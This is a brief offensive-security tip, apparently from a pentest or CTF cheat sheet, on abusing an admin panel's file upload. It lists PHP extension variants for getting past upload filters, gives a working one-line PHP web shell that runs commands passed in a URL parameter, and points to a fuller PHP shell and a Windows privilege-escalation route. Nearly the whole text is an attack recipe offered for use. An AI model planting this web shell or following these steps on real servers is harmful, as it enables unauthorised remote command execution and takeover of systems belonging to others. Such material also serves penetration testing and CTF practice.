If you log into an admin panel, the first thing to look for is a file upload feature. These are some extensions you could try:

- test.php
- test.phtml
- test.php5

For PHP, use this payload:

```
<?php system($_GET["cmd"]); ?>
```

You can also try using the PHP shell from Ivan Sincek. If you have a Windows target, it may give you access as the service account which will have SeImpersonatePrivilege enabled.